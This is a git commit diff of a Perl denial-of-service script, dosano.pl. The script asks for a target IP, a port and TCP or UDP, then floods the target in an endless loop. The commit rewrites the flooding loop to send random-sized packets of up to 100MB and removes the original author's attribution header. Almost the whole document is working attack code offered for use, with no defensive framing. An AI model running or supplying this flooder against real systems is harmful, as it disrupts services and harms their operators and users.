55717ad3c9aecd7d61c5c603df15394f7c6c2484
randompe009 <126852324+randompe009@users.noreply.github.com>
2025-04-05 20:09:24 -0300

    Add files via upload

--- dosano.pl
+++ dosano.pl
@@ -1,16 +1,9 @@
 #!/usr/bin/perl
-#==============INFO==============#
-# SCRIPT: Dosano
-#    JOB: Denial Of Service Attack[DosAttack]
-#CodedBy: Oseid Aldary
-
-#=== Use Modules ===#
 use IO::Socket;
 use Scalar::Util qw(looks_like_number);
 
-#=== Clear Screen ===#
 system("cls || clear");
-#Script Banner================================================================
+
 print q{ 
                    .-"      "-.  
                   /            \ 
@@ -26,90 +19,81 @@ print q{
 
  [---]   by:> Zix The Redencion   [---]
 };
-# Check Intenret Connection !
-my $check = IO::Socket::INET->new( 'PeerAddr'=>'www.google.com', 
-	'PeerPort'=>80, 
-	'Timeout'=>2, 
-	'proto'=>'tcp');
-if(!(defined $check && $check)){
-	print("[-] Internet Status[ Not Connected ]");
-	print("\n[!] Error: Please Check Your Internet Connection !!!");
-	exit(1);
+
+# Check Internet Connection
+my $check = IO::Socket::INET->new( 'PeerAddr'=>'www.google.com', 'PeerPort'=>80, 'Timeout'=>2, 'proto'=>'tcp');
+if (!(defined $check && $check)) {
+    print("[-] Internet Status[ Not Connected ]");
+    print("\n[!] Error: Please Check Your Internet Connection !!!");
+    exit(1);
 }
 $check->close();
-# INPUT TARGET INFO ==============================================
+
 print "\n===============================";
-print "\n[~] Enter TargetIP: "; # Set Target IP
+print "\n[~] Enter TargetIP: ";
 $host = <STDIN>;
-chomp ($host);
-while ($host eq ""){
- print "   [!] Enter TargetIP?: ";
- $host = <STDIN>;
- chomp ($host);
+chomp($host);
+while ($host eq "") {
+    print "   [!] Enter TargetIP?: ";
+    $host = <STDIN>;
+    chomp($host);
 }
-print "TRAGET ==> $host";
+print "TARGET ==> $host";
+
 print "\n===============================";
-print "\n[~] Enter Port: "; # Set Port
+print "\n[~] Enter Port: ";
 $port = <STDIN>;
-chomp ($port);
-while ($port eq "" || !looks_like_number($port) || !grep{$port eq $_}(0..65535)){ 
- print "   [!] Enter PORT?: ";       
- $port = <STDIN>;
- chomp ($port); 
-} 
+chomp($port);
+while ($port eq "" || !looks_like_number($port) || !grep { $port eq $_ } (0..65535)) {
+    print "   [!] Enter PORT?: ";
+    $port = <STDIN>;
+    chomp($port);
+}
 print "PORT ==> $port";
+
 print "\n===============================";
-print "\n[~] Enter Protockol (TCP or UDP) :"; # Set Protockol;
+print "\n[~] Enter Protocol (TCP or UDP): ";
 $proto = <STDIN>;
-chomp ($proto);
-while ($proto eq "" || !grep{$proto eq $_} 'TCP','UDP','tcp','udp'){
- print "   [!] Enter Protockol (TCP or UDP) ?: ";
- $proto = <STDIN>;
- chomp ($proto);
+chomp($proto);
+while ($proto eq "" || !grep { lc($proto) eq lc($_) } ('TCP','UDP')) {
+    print "   [!] Enter Protocol (TCP or UDP) ?: ";
+    $proto = <STDIN>;
+    chomp($proto);
 }
 print "Protocol ==> $proto";
 print "\n===============================\n";
 sleep(1);
 
 $sock = IO::Socket::INET->new(
-        PeerAddr => $host,
-        PeerPort => $port,
-        Proto => "$proto" ) || die "\n[!] Connection Failed To Target[$host] On Port[$port/$proto] !!!\n[!] Please Check Your TargetIP\n";
+    PeerAddr => $host,
+    PeerPort => $port,
+    Proto    => "$proto"
+) || die "\n[!] Connection Failed To Target[$host] On Port[$port/$proto] !!!\n[!] Please Check Your TargetIP\n";
+
 system("clear || cls");
-print "\n[*] Attack Has Been Start On [$host:$port] proto => [$proto].......\n\n";
+print "\n[*] Attack Started on [$host:$port] proto => [$proto]...\n\n";
 sleep(1);
+
 while (1) {
-  if(grep{$proto eq $_} 'TCP','tcp'){
-       $sock = IO::Socket::INET->new(
-        PeerAddr => $host,
-        PeerPort => $port,
-        Proto => "$proto" ) || die "\n[!] Connection Failed To Target[$host] On Port[$port/$proto] !!!\n[!] Please Check Your TargetIP\n";
-        for($i=0; $i<=500; $i++){
-            $size = rand() * 8921873 * 99919988;
-            print ("Flooding: (=>$host:$port~$proto<=) Packets sent: $size\n");
-            send($sock, $size*2, $size*2); 
-            send($sock, $size*3, $size*3);
-            send($sock, $size*4, $size*4);
-            send($sock, $size*9999999999999,$size*9999999999999);
-            send($sock, "WEASRDWR#@%@#%$@#$#@%$@#%@#$@#$@#$@#$@#@#%23%235543wewreqwr#@523sdfsa"*2, "WEASRDWR#@%@#%$@#$#@%$@#%@#$@#$@#$@#$@asasf#@#%23%235543wewreqwr#@523sdfsa"*3);
+    if (lc($proto) eq 'tcp') {
+        $sock = IO::Socket::INET->new(
+            PeerAddr => $host,
+            PeerPort => $port,
+            Proto    => "$proto"
+        ) || die "\n[!] Connection Failed To Target[$host] On Port[$port/$proto] !!!\n";
+
+        for ($i = 0; $i <= 500; $i++) {
+            my $size = int(rand(1024 * 1024 * 100)); # até 100MB
+            print ("Flooding: (=>$host:$port~$proto<=) Packet size: $size bytes\n");
+            my $data = 'A' x $size;
+            send($sock, $data, 0);
         }
 
-  }else{
-            $size = rand() * 8921873 * 99919988;
-            print ("Flooding: (=>$host:$port~$proto<=) Packets sent: $size\n");
-            send($sock, $size*2, $size*2); 
-            send($sock, $size*3, $size*3);
-            send($sock, $size*4, $size*4);
-            send($sock, $size*9999999999999,$size*9999999999999);
-            send($sock, "WEASRDWR#@%@#%$@#$#@%$@#%@#$@#$@#$@#$@#@#%23%235543wewreqwr#@523sdfsa"*2, "WEASRDWR#@%@#%$@#$#@%$@#%@#$@#$@#$@#$@asasf#@#%23%235543wewreqwr#@523sdfsa"*3);
- }
+    } else {
+        my $size = int(rand(1024 * 1024 * 100)); # até 100MB
+        print ("Flooding: (=>$host:$port~$proto<=) Packet size: $size bytes\n");
+        my $data = 'A' x $size;
+        send($sock, $data, 0);
+    }
 }
-$sock->close()
-##############################################################
-#####################                #########################
-#####################  END OF SCRIPT #########################
-#####################                #########################
-##############################################################
-#This Script by Oseid Aldary
-#Have a nice day :)
-#GoodBye
+$sock->close();
